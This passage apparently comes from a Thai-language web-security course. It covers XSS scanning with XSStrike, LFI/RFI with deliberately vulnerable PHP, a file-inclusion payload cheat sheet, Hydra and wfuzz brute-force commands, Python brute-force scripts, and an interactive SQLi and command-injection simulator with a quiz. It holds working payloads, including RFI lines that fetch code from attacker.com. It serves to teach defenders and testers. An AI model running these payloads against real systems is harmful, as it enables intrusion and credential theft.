<td style="padding: 10px;">ส่งสวมคุกกี้สิทธิ์เซสชันของระบบเข้าไปเพื่อสแกนโซนล็อกอินหลังบ้าน</td>
</tr>
</tbody>
</table>
</div>

#### 🐚 ตัวอย่างรูปแบบคำสั่งการใช้งานจริงของ XSStrike
- **สแกนค้นหาเบื้องต้นของพารามิเตอร์**:
  `python3 xsstrike.py -u "http://target.com/search.php?q=test"`
- **สั่งสแกนเจาะระบบอัตโนมัติพร้อมเลือกคำตอบ Payload ให้อัตโนมัติ**:
  `python3 xsstrike.py --auto -u "http://target.com/search.php?q=test"`
- **รันตรวจสอบโหมดหลบเลี่ยงไฟร์วอลล์ (WAF Bypass Mode)**:
  `python3 xsstrike.py -u "http://target.com/search.php?q=" --fuzz`

---

### 📄 SLIDE 161-170: File Inclusion Attacks (ภัยคุกคามการเรียกเข้าใช้ไฟล์ระบบ)
**ช่องโหว่การนำเข้าไฟล์ระบบ (File Inclusion)** เกิดจากการที่โปรแกรมหรือภาษาหลังบ้านยอมรับพาธไฟล์ที่ผู้ใช้อินพุตมานำไปเรียกใช้งานฟังก์ชันดึงเนื้อหา (เช่น `include`, `require`, `file_get_contents` ใน PHP) โดยขาดการตรวจสอบสิทธิ์ความมั่นคงปลอดภัย
- **Local File Inclusion (LFI)**: แฮกเกอร์ใช้ช่องโหว่เพื่อขออ่านหรือประมวลผลไฟล์ภายใน **ระบบปฏิบัติการของเว็บเซิร์ฟเวอร์เอง** (เช่น ดึงไฟล์ `/etc/passwd` หรือล็อกของเครื่องแม่ข่าย)
- **Remote File Inclusion (RFI)**: แฮกเกอร์สามารถสั่งให้เซิร์ฟเวอร์ดึงเนื้อหาและประมวลผลสคริปต์แปลกปลอมที่เก็บไว้ใน **เครื่องเครือข่ายภายนอก (Remote Server)** ซึ่งมักก่อให้เกิดความเสี่ยงถูกแฮกควบคุมเครื่องเซิร์ฟเวอร์ได้อย่างง่ายดาย

#### 💻 ตัวอย่างโค้ดอันตรายเปรียบเทียบ LFI vs RFI (Vulnerable source comparison)
```php
// 🟢 ตัวอย่างช่องโหว่ Local File Inclusion (LFI)
<?php
    // แอปพลิเคชันนำชื่อไฟล์ในหน้าเพจไปแสดงผลตรงๆ
    include($_GET['page']);
?>
// หากแฮกเกอร์พิมพ์เรียก: page=../../../../etc/passwd ระบบจะอ่านข้อมูลรายชื่อบัญชีระบบออกมาแสดงทันที

// 🔵 ตัวอย่างช่องโหว่ Remote File Inclusion (RFI)
<?php
    // แอปนำค่าพาธที่เหยื่อกรอกไปเรียกใช้งาน
    include($_GET['file']);
?>
// หากแฮกเกอร์พิมพ์เรียก: file=http://attacker.com/malicious_shell.txt ระบบจะดึงโค้ดอันตรายภายนอกมาประมวลผล
```

---

### 📄 SLIDE 171-180: File Inclusion Attacks in Action (ตัวอย่างการใช้งานเพื่อตรวจสอบความปลอดภัย)

#### 🌐 1. การป้อนเรียกใช้งานผ่าน URL เพื่อเข้าถึงทรัพยากร
- **LFI - การขยับตำแหน่งข้ามโฟลเดอร์เพื่อดึงรายชื่อผู้ใช้ Linux**:
  `http://example.com/getFile?name=../../../etc/passwd`
- **LFI - การดึงข้อมูลล็อกเข้าใช้งาน Apache เพื่อทำการลอบฝัง Web Shell (Log Poisoning)**:
  `http://target.com/index.php?page=../../../../../../../var/log/apache2/access.log`
- **RFI - การสั่งประมวลผลโค้ดสคริปต์อันตรายข้ามเครือข่ายภายนอก**:
  `http://target.com/index.php?page=http://attacker.com/malicious_file.php`

#### 🐚 2. การสั่งยิงช่องโหว่ดึงไฟล์ระบบโดยใช้คำสั่ง cURL (POST-Based LFI)
```bash
curl -X POST -d "name=../../../etc/passwd" http://example.com/getFile
```

---

### 📄 SLIDE 181-190: File Inclusion Payload Cheatsheet (ตารางคีย์เจาะระบบนำเข้าไฟล์)
<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 10px; font-weight: bold; width: 60px;">ประเภท</th>
<th style="padding: 10px; font-weight: bold; width: 340px;">คีย์เจาะระบบ (Payload)</th>
<th style="padding: 10px; font-weight: bold;">ผลลัพธ์และคำอธิบาย (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #f43f5e;">../../../../etc/passwd</td>
<td style="padding: 10px;">ขยับตำแหน่งขึ้นไปอ่านไฟล์รายชื่อผู้ใช้ระบบปฏิบัติการ Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #f43f5e;">../../../../../../../boot.ini</td>
<td style="padding: 10px;">ดึงไฟล์โครงสร้างการบูตเปิดระบบปฏิบัติการ Windows</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #3b82f6;">php://input</td>
<td style="padding: 10px;">เรียกใช้อินพุตสตรีมของ PHP เพื่อป้อนประมวลผลโค้ดอันตรายผ่าน Request Body</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #3b82f6;">php://filter/convert.base64-encode/resource=index.php</td>
<td style="padding: 10px;">เรียกอ่านโค้ดต้นฉบับภาษา PHP (Source Code) โดยส่งออกมาในรูปแบบรหัส Base64 เพื่อเลี่ยงการรันประมวลผลไฟล์ซ้อน</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #fbbf24;">....//....//....//windows/system.ini</td>
<td style="padding: 10px;">บายพาสคีย์เวิร์ดการกรองคำว่า <code>../</code> แบบชั้นเดียว โดยการซ้อนรูปแบบอักขระ</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #fbbf24;">..\..\..\..\..\windows\win.ini</td>
<td style="padding: 10px;">ใช้เครื่องหมาย Backslash ขยับตำแหน่งไฟล์เพื่อเลี่ยงตัวกรองพารามิเตอร์แบบปกติ (Windows เท่านั้น)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #38bdf8;">LFI</td>
<td style="padding: 10px; font-family: monospace; color: #fbbf24;">%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd</td>
<td style="padding: 10px;">ใช้รหัสตัวอักษร URL-encoded (เช่น <code>%2e%2e%2f</code> แปลงมาจาก <code>../</code>) เพื่อเลี่ยงการจับความสัมพันธ์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08)">
<td style="padding: 10px; font-weight: bold; color: #10b981;">RFI</td>
<td style="padding: 10px; font-family: monospace; color: #ec4899;">http://attacker.com/mal_file.txt</td>
<td style="padding: 10px;">ดึงไฟล์สคริปต์ของแฮกเกอร์ข้ามโดเมนภายนอกเข้ามาประมวลผลบนเป้าหมาย</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 191-195: Brute Force Attacks (การเดาแบบรุนแรงเพื่อเข้าสู่ระบบ)
- **คำจำกัดความ**: Brute Force Attack คือกระบวนการลองสุ่มรหัสผ่านหรือข้อมูลยืนยันตัวตนแบบลองผิดลองถูกซ้ำๆ (Trial-and-Error) โดยระบบควบคุมอัตโนมัติหรือโปรแกรม เพื่อพยายามสุ่มเดาจนกว่าจะเจอข้อมูลที่ถูกต้อง
- **เป้าหมายหลัก**:
  - การแกะข้อมูลรหัสผ่านบัญชีทั่วไปและแอดมิน (Credential cracking)
  - เข้ายึดระบบหรือปลดล็อกขอบเขตข้อมูลที่ถูกเข้ารหัสไว้

#### 🛠️ สรุปประเภทการสุ่มเจาะเข้าสู่ระบบ (Brute Force Types)
<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 10px; font-weight: bold; width: 220px;">ประเภทการเดา (Attack Type)</th>
<th style="padding: 10px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #ffffff;">Simple Brute Force</td>
<td style="padding: 10px;">ใช้ตัวอักษรและตัวเลขประมวลผลทุกตัวอักษรที่สลับเป็นไปได้ทั้งหมด (เช่น aa1, aa2...)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-weight: bold; color: #ffffff;">Dictionary Attack</td>
<td style="padding: 10px;">สุ่มข้อมูลรหัสผ่านอ้างอิงจากคลังรายการรหัสผ่านยอดนิยมในอดีต (Wordlist/Dictionary)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #ffffff;">Hybrid Attack</td>
<td style="padding: 10px;">นำคำอ้างอิงจากพจนานุกรมมาเสริมแต่งตัวอักษรหรือตัวเลขต่อท้ายเพิ่มเติม (เช่น `password123`)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-weight: bold; color: #ffffff;">Credential Stuffing</td>
<td style="padding: 10px;">นำรายชื่อบัญชีและรหัสผ่านคู่ที่หลุดรั่วออกมาในสากลโลก (Data Breaches) มาทดลองเปิดใช้กับเป้าหมาย</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-weight: bold; color: #ffffff;">Reverse Brute Force</td>
<td style="padding: 10px;">ใช้รหัสผ่านยอดฮิตค่าเดียว (เช่น <code>password123</code>, <code>123456</code>) ไล่ล็อกอินสุ่มกับชื่อบัญชีผู้ใช้หลายหมื่นรายชื่อ</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 196-200: Brute Force Tool: Hydra (โปรแกรมสุ่มล็อกอินความเร็วสูง)
**Hydra** คือหนึ่งในสุดยอดโปรแกรมรันสุ่มกุญแจความมั่นคงและบัญชีผ่านเครือข่ายบรรทัดคำสั่งที่รวดเร็วที่สุด:
- รองรับการสแกนผ่านหลายโปรโตคอลระบบ เช่น HTTP, SSH, FTP, Telnet, SMB เป็นต้น
- **รูปแบบคำสั่งการรันเดารหัสผ่านหน้าเว็บ**:

```bash
# 🟢 1. การเดาข้อมูลล็อกอินแบบส่งพารามิเตอร์ผ่าน GET Method
hydra -l admin -P /path/to/passwords.txt http-get://target.com/login.php

# 🔴 2. การเดาข้อมูลล็อกอินแบบส่งผ่านแบบฟอร์ม POST Form Method
hydra -l admin -P /path/to/passwords.txt http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid login"
```
- **ความหมายของสัญลักษณ์ควบคุม**:
  - `-l admin`: ระบุบัญชีเป้าหมายที่เจาะจงโจมตีเป็นชื่อ "admin"
  - `-P /path/to/passwords.txt`: แนบพาธคลังไฟล์รหัสผ่านที่เตรียมมาทดลองสุ่ม
  - `http-post-form`: กำหนดชนิดโปรโตคอลสำหรับการกรอกโพสต์ฟอร์มเว็บ
  - `^USER^` / `^PASS^`: ตัวแปรที่ระบบจะส่งรายชื่อและรหัสผ่านจากรายการเข้าไปแทนที่ทีละคำ
  - `F=Invalid login`: ประโยคแจ้งผลการล็อกอินล้มเหลว (Failure Message) ที่ปรากฏหน้าจอ เพื่อให้โปรแกรมแยกแยะได้ว่าคำตอบใดผิด

---

### 📄 SLIDE 201-203: Web Fuzzing by Wfuzz
**Wfuzz** คือเครื่องมือสแกนหาไดเรกทอรีและทดสอบยิงพารามิเตอร์ดิบผ่านเว็บเบราว์เซอร์ โดยจะนำอินพุตมาสลับสอดแทรกแทนที่ตำแหน่งคีย์เวิร์ดคำว่า `FUZZ`:
```bash
wfuzz -c -z file,/path/to/passwords.txt --hc 404 \
  http://target.com/login.php?username=admin&password=FUZZ
```
- **ความหมายออปชัน**:
  - `-c`: แสดงผลลัพธ์เป็นสีเพื่อให้อ่านข้อมูลล็อกอินได้ง่ายขึ้น
  - `-z file,...`: นำคลังไฟล์รหัสผ่านหรือเวิร์ดลิสต์มาใช้อ้างอิง
  - `--hc 404`: สั่งละเว้นการแสดงผลรหัสการขอเว็บที่เป็นความผิดพลาด 404 (Ignored Response Codes)

---

### 📄 SLIDE 204-207: Python Scripts for Web Brute Force (GET requests)
นอกเหนือจากการใช้โปรแกรมสำเร็จรูป นักพัฒนาและแฮกเกอร์มักเขียนสคริปต์ภาษา Python โดยใช้งานไลบรารี `requests` เพื่อประมวลผลเงื่อนไขการสุ่มหาแบบรวดเร็วและสามารถคัดกรองข้อมูลเองได้:

#### 🐍 1. ตัวอย่างสคริปต์สุ่มหาหน้าเว็บเพจที่ถูกซ่อนไว้ตามลำดับตัวเลข
```python
import requests

# ทำการรันวนลูปตัวเลขตั้งแต่ 1000 ถึง 9000 เพื่อสุ่มหาหน้าเว็บที่เปิดใช้งานจริง
for i in range(1000, 9000):
    url = 'http://172.19.19.129:8000/dakw/'
    link = url + 'room' + str(i) + '.html'
    
    # ส่งคำสั่งขอหน้าเว็บด้วย GET method
    web = requests.get(link)
    html = web.text
    
    # ตรวจสอบการโหลดหน้าเพจ หากไม่ปรากฏข้อความผิดพลาด ให้แสดง URL
    if 'Not Found' not in html:
        print("[FOUND] -> " + link)
```

#### 🐍 2. ตัวอย่างการสุ่มเลขที่ระบุจัดระเบียบเลขศูนย์นำหน้า (Zero-padded IDs)
```python
import requests

# รันลูปหาหน้าที่เก็บไฟล์ข้อมูล ID ลำดับที่ 6 ถึง 500
for i in range(6, 500):
    # สั่งจัดรูปแบบให้ตัวเลขมีความยาวเท่ากับ 5 หลักเสมอ เช่น 00006, 00007...
    link = 'http://172.19.19.129:8003/page/' + str(i).zfill(5)
    
    web = requests.get(link)
    html = web.text
    
    # หากไม่พบประโยคความผิดพลาด 404 แสดงว่าหน้าเอกสารมีความลับอยู่จริง
    if html.find('404 Not Found') == -1:
        print("[FOUND PADDING] -> " + link)
```

---

### 📄 SLIDE 208-210: Python Scripts for Web Brute Force (POST requests & Lottery)

#### 🐍 1. ตัวอย่างสคริปต์ส่งคำสั่งประมวลผลข้อมูลผ่าน POST requests
```python
import requests

for i in range(501, 10000):
    link = 'http://172.19.19.129:8003/new/'
    
    # เตรียมข้อมูลที่จัดรูปแบบเพื่อส่งไปโพสต์ลงฟอร์ม
    s = 'Test' + str(i).zfill(5)
    
    # ส่งชุดพารามิเตอร์แบบ POST request
    web = requests.post(link, { 'title': s, 'message': s })
    
    # ยิงทดสอบเช็คหน้าที่สร้างเสร็จสิ้นทันที
    link_page = 'http://172.19.19.129:8003/page/' + str(i).zfill(5)
    web_check = requests.get(link_page)
    html = web_check.text
    
    # ตรวจเช็คผลลัพธ์การจัดเก็บ
    if html.find('404 Not Found') >= 0:
        print("[COMPLETED POST VERIFY] -> " + link)
        break
```

#### 🐍 2. ตัวอย่างการเขียนสคริปต์ไขรหัสผ่าน/เลขอัตโนมัติ (Lottery / Digit Brute Force)
สคริปต์รันวนซ้อนแบบ nested loops เพื่อสุ่มเดาตัวเลข 3 หลัก (000 - 999) ในการส่งประเมินผล:
```python
import requests

def loop():
    # ลูปตัวเลขหลักที่หนึ่ง สอง และสามทีละค่า
    for a in range(10):
        for b in range(10):
            for c in range(10):
                # โพสต์ชุดตัวเลขที่สลับไปหาฟอร์มวิเคราะห์ผลลัพธ์หลังบ้าน
                web = requests.post('http://172.19.19.129:8000/ecxb/index.php',
                                    {'digit1': a, 'digit2': b, 'digit3': c})
                html = web.text
                
                # แสดงความคืบหน้าของตัวเลขปัจจุบันออกหน้าจอ
                print("[TESTING DIGIT] -> " + str(a) + str(b) + str(c))
                
                # หากเงื่อนไขในเว็บไม่ปรากฏข้อความล้มเหลว แสดงว่าเราทายเลขถูกต้อง
                if 'Unlucky Lottery' not in html:
                    print("[WINNER COMBINATION FOUND!] -> " + str(a) + str(b) + str(c))
                    return
loop()
```
"""
val179_1 = """### 💻 SQLi & Command Injection Lab Simulator (จำลองการแทรกคำสั่งประมวลผล)

คลิกหัวข้อด้านซ้ายมือเพื่อศึกษาช่องโหว่ และ **กดปุ่มรันจำลองการทำงานจริง (Run Simulation)** เพื่อดูผลการแทรกคำสั่ง:

<style type="text/css">
.w-sandbox-main { display: flex !important; gap: 20px !important; margin: 1.5rem auto !important; max-width: 1000px !important; }
.w-sandbox-nav { width: 220px !important; display: flex !important; flex-direction: column !important; gap: 8px !important; flex-shrink: 0 !important; }
.w-nav-item { background: rgba(255, 255, 255, 0.02) !important; border: 1px solid rgba(255, 255, 255, 0.06) !important; border-radius: 6px !important; padding: 10px 14px !important; color: #cbd5e1 !important; text-align: left !important; cursor: pointer !important; font-size: 0.78rem !important; transition: all 0.2s !important; }
.w-nav-item:hover, .w-nav-item.active { border-color: #3b82f6 !important; color: #ffffff !important; background: rgba(59, 130, 246, 0.05) !important; }
.w-nav-item.active { font-weight: 700 !important; box-shadow: 0 0 8px rgba(59, 130, 246, 0.15) !important; }
.w-sandbox-panels { flex-grow: 1 !important; display: flex !important; flex-direction: column !important; gap: 14px !important; }
.w-sand-panel { display: none; background: #05070f !important; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important; }
.w-sand-panel.active { display: block !important; }
</style>
<div class="w-sandbox-main" style="display: flex; gap: 20px; margin: 1.5rem auto; max-width: 1000px;">
<div class="w-sandbox-nav" style="width: 220px; display: flex; flex-direction: column; gap: 8px; flex-shrink: 0;">
<button id="nav-item-sqlitest" class="w-nav-item active" style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 6px; padding: 10px 14px; color: #cbd5e1; text-align: left; cursor: pointer; font-size: 0.78rem; transition: all 0.2s;" onclick="showSandboxItem('sqlitest', this)">1. UNION SQLi Test</button>
<button id="nav-item-cmdtest" class="w-nav-item" style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 6px; padding: 10px 14px; color: #cbd5e1; text-align: left; cursor: pointer; font-size: 0.78rem; transition: all 0.2s;" onclick="showSandboxItem('cmdtest', this)">2. OS Command Injection</button>
</div>
<div class="w-sandbox-panels" style="flex-grow: 1; display: flex; flex-direction: column; gap: 14px;">
<div id="panel-sqlitest" class="w-sand-panel active" style="background: #05070f; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important;">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>1. UNION-Based SQL Injection Simulation</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(59,130,246,0.08); border: 1px solid rgba(59,130,246,0.2); color: #3b82f6; font-family: monospace;">UNION SQLi</span>
</div>
<pre style="font-family: monospace; font-size: 0.8rem; color: #3b82f6; white-space: pre-wrap; margin: 0 0 12px; background: rgba(0,0,0,0.2); padding: 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">' UNION SELECT null, username, password FROM users --</pre>
<div style="background: #02040a; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 16px; overflow: hidden;">
<div style="background: rgba(255,255,255,0.03); padding: 6px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
<span style="font-size: 0.65rem; color: #64748b; font-weight: 800; letter-spacing: 0.06em; font-family: monospace;">🐚 Terminal Console</span>
<button style="background: rgba(59,130,246,0.1); border: 1px solid rgba(59,130,246,0.3); border-radius: 4px; color: #3b82f6; font-size: 0.68rem; padding: 3px 8px; cursor: pointer; font-family: monospace; font-weight: 700; transition: all 0.15s;" onclick="startWebSim('sqlitest')">▶ Run Simulation</button>
</div>
<div id="term-sqlitest" style="font-family: monospace; font-size: 0.76rem; color: #a7f3d0; padding: 12px 16px; white-space: pre-wrap; min-height: 90px;">
<span style="color: #3ddc84;">db-cli$</span> [กดปุ่ม Run Simulation เพื่อส่ง UNION payload]
</div>
</div>
<div style="background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 8px; padding: 16px; font-size: 0.83rem; color: #cbd5e1; line-height: 1.65;">
<h5 style="margin: 0 0 8px; font-size: 0.85rem; color: #fbbf24; font-weight: bold;">⚙️ Command Description</h5>
<p style="margin: 0;">คิวรีผสาน UNION SELECT ช่วยให้เราแอบไปดึงข้อมูลผู้ใช้งานและรหัสผ่านจากตารางอื่นออกมาทางเว็บบอร์ดแสดงผล</p>
</div>
</div>
<div id="panel-cmdtest" class="w-sand-panel" style="background: #05070f; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important; display: none;">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>2. OS Command Injection Bypass Space</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(59,130,246,0.08); border: 1px solid rgba(59,130,246,0.2); color: #3b82f6; font-family: monospace;">OS Command</span>
</div>
<pre style="font-family: monospace; font-size: 0.8rem; color: #3b82f6; white-space: pre-wrap; margin: 0 0 12px; background: rgba(0,0,0,0.2); padding: 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">cat${IFS}/etc/passwd</pre>
<div style="background: #02040a; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 16px; overflow: hidden;">
<div style="background: rgba(255,255,255,0.03); padding: 6px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
<span style="font-size: 0.65rem; color: #64748b; font-weight: 800; letter-spacing: 0.06em; font-family: monospace;">🐚 Terminal Console</span>
<button style="background: rgba(59,130,246,0.1); border: 1px solid rgba(59,130,246,0.3); border-radius: 4px; color: #3b82f6; font-size: 0.68rem; padding: 3px 8px; cursor: pointer; font-family: monospace; font-weight: 700; transition: all 0.15s;" onclick="startWebSim('cmdtest')">▶ Run Simulation</button>
</div>
<div id="term-cmdtest" style="font-family: monospace; font-size: 0.76rem; color: #a7f3d0; padding: 12px 16px; white-space: pre-wrap; min-height: 90px;">
<span style="color: #3ddc84;">kali$</span> [กดปุ่ม Run Simulation เพื่อส่งคำสั่ง]
</div>
</div>
<div style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 8px; padding: 16px; font-size: 0.83rem; color: #cbd5e1; line-height: 1.65;">
<h5 style="margin: 0 0 8px; font-size: 0.85rem; color: #fbbf24; font-weight: bold;">⚙️ Command Description</h5>
<p style="margin: 0;">การเขียนตัวแปร IFS ช่วยเลี่ยงการกรองช่องว่าง ทำให้คำสั่งสามารถรันเพื่อเรียกดูไฟล์ระบบปฏิบัติการได้เหมือนเดิม</p>
</div>
</div>
</div>
</div>
<script>
window.showSandboxItem = function(itemKey, element) {
  const navButtons = document.querySelectorAll('.w-sandbox-nav button');
  navButtons.forEach(btn => {
    btn.style.borderColor = 'rgba(255, 255, 255, 0.06)';
    btn.style.color = '#cbd5e1';
    btn.style.background = 'rgba(255, 255, 255, 0.02)';
  });
  element.style.borderColor = '#3b82f6';
  element.style.color = '#ffffff';
  element.style.background = 'rgba(59, 130, 246, 0.05)';
  const panels = document.querySelectorAll('.w-sand-panel');
  panels.forEach(p => { p.style.display = 'none'; });
  const target = document.getElementById('panel-' + itemKey);
  if (target) { target.style.display = 'block'; }
}
window.startWebSim = function(itemKey) {
  const term = document.getElementById('term-' + itemKey);
  if (!term) return;
  term.innerHTML = '<span style="color:#64748b;">kali$</span> <span style="color:#ffffff; font-weight:bold;">Executing commands...</span>\\n[.] Verifying backend sanitization checks...';
  setTimeout(() => {
    if (itemKey === 'sqlitest') {
      term.innerHTML = '<span style="color:#64748b;">db-cli$</span> <span style="color:#3ddc84; font-weight:bold;">UNION select output:</span>\\nID: null | User: admin | Pass: <span style="color:#ef4444;">$2y$10$xyzPasswordHash...</span>\\nID: null | User: user1 | Pass: <span style="color:#ef4444;">$2y$10$abcHashUser1...</span>\\n\\n[+] Data exfiltration successful!';
    } else if (itemKey === 'cmdtest') {
      term.innerHTML = '<span style="color:#64748b;">kali$</span> <span style="color:#3ddc84; font-weight:bold;">cat /etc/passwd:</span>\\nroot:x:0:0:root:/root:/bin/bash\\nbin:x:1:1:bin:/bin:/sbin/nologin\\n\\n[+] Command completed without spaces.';
    }
  }, 1000);
}
</script>"""

val179_2 = """### ✏️ Lesson Quick Quiz (แบบทดสอบทบทวนความรู้ท้ายบทเรียน)

ตอบคำถามประเมินความรู้ 2 ข้อด้านล่างนี้ให้ถูกต้องครบถ้วนเพื่อทำการผ่านบทเรียนย่อยนี้ (Lesson Clear):

<style>
.mini-quiz-box{width:100%;max-width:1050px;margin:2rem auto;background:rgba(15,17,26,0.45);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:24px;box-shadow:0 8px 32px rgba(0,0,0,0.3);box-sizing:border-box;}
.mq-layout-container {display:flex; gap:24px; align-items:stretch;}
.mq-questions-col {flex:1;}
.mq-gauge-col {width:160px; display:flex; flex-direction:column; align-items:center; justify-content:center; border-left:1px solid rgba(255,255,255,0.06); padding-left:24px;}
@media (max-width: 768px) {
  .mq-layout-container {flex-direction:column;}
  .mq-gauge-col {width:100%; border-left:none; padding-left:0; border-top:1px solid rgba(255,255,255,0.06); padding-top:24px;}
}
.neon-gauge-container {position:relative; width:120px; height:120px;}
.neon-gauge {width:100%; height:100%;}
.neon-gauge-bg {fill:none; stroke:rgba(255,255,255,0.05); stroke-width:2.8;}
.neon-gauge-fill {fill:none; stroke:url(#gauge-grad-179); stroke-width:2.8; stroke-linecap:round; transition:stroke-dasharray 0.5s ease; filter:drop-shadow(0 0 5px rgba(0,240,255,0.4));}
.neon-gauge-text {fill:#ffffff; font-family:'JetBrains Mono',monospace; font-size:9px; font-weight:800; text-anchor:middle; filter:drop-shadow(0 0 2px rgba(255,255,255,0.3));}

.mq-q{margin-bottom:20px;}
.mq-title{font-size:0.9rem;font-weight:800;color:#e2e8f0;margin-bottom:10px;}
.mq-title span{color:#00f0ff;font-family:'JetBrains Mono',monospace;margin-right:6px;}
.mini-opts{display:flex;flex-direction:column;gap:6px;}
.mini-opt{display:flex;align-items:center;gap:10px;padding:10px 14px;background:rgba(255,255,255,0.015);border:1px solid rgba(255,255,255,0.05);border-radius:8px;cursor:pointer;transition:all 0.15s ease;user-select:none;font-size:0.83rem;color:#cbd5e1;}
.mini-opt:hover{border-color:rgba(0,240,255,0.2);background:rgba(0,240,255,0.02);}
.mini-opt.selected{border-color:#00f0ff;background:rgba(0,240,255,0.08);color:#ffffff;}
.mini-opt.correct{border-color:#3ddc84;background:rgba(61,220,132,0.08);color:#ffffff;}
.mini-opt.incorrect{border-color:#ff007f;background:rgba(255,0,127,0.08);color:#ffffff;}
.mini-bullet{width:15px;height:15px;border:1px solid rgba(255,255,255,0.3);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:0.58rem;font-weight:bold;}
.mini-opt.selected .mini-bullet{border-color:#00f0ff;background:#00f0ff;color:#070910;}

.mq-btn-check{padding:10px 20px;background:#00f0ff;border:none;border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:0.82rem;font-weight:800;color:#070910;cursor:pointer;box-shadow:0 0 10px rgba(0,240,255,0.25);transition:all 0.15s ease;}
.mq-btn-check:hover{background:#ffffff;box-shadow:0 0 15px rgba(255,255,255,0.4);transform:translateY(-1px);}
.mq-status-bar{display:none;padding:12px 16px;border-radius:8px;font-size:0.85rem;margin-top:16px;font-weight:700;line-height:1.5;}
</style>

<div id="mq-box-179" class="mini-quiz-box">
<div class="mq-layout-container">
<div class="mq-questions-col">
<!-- Question 1 -->
<div class="mq-q" data-correct="B">
<div class="mq-title"><span>Q1.</span> ช่องโหว่ Cross-Site Scripting (XSS) เกิดจากการลอบฝังแทรกสคริปต์โค้ดประเภทใดเข้ามาทำงานฝั่ง Client Browser?</div>
<div class="mini-opts">
<div class="mini-opt" data-val="A"><span class="mini-bullet">A</span> SQL Query code</div>
<div class="mini-opt" data-val="B"><span class="mini-bullet">B</span> JavaScript</div>
